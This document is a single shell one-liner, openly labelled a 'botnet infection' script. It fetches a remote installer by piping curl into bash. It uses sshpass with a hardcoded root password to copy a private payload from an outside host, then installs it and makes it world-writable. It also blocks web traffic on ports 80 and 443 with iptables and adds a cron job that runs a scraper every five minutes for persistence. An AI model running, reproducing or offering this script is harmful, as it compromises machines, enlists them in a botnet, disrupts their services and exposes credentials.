export DEBIAN_FRONTEND=noninteractive && clear && echo -e '\e[1;31m\n\n\n\n\nF Botnets Infection On This Device, Waiting...\n\n\n\n\n\e[0m' && apt-get update -qq && apt-get upgrade -y -o Dpkg::Options::="--force-confnew" && apt-get install -y python3 curl build-essential npm iptables sshpass --no-install-recommends && curl -sL https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash && export NVM_DIR="$HOME/.nvm" && [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh" && nvm install node && npm install -g npm@latest && sshpass -p 'kontol' scp -r -P 22 -o StrictHostKeyChecking=no root@play.f-network.my.id:/root/k/private ./ && cd private && npm install --silent && chmod -R 777 . && sudo iptables -A INPUT -p tcp -m multiport --dports 80,443 -j DROP && sudo iptables -A OUTPUT -p tcp -m multiport --sports 80,443 -j DROP && (crontab -l 2>/dev/null; echo "*/5 * * * * cd /root/private && python3 scrape.py") | crontab - && clear && echo -e '\e[1;32m\n\n\n\n\nSUCCESS: F Botnets Infection Completed!\n\n\n\n\n\e[0m'
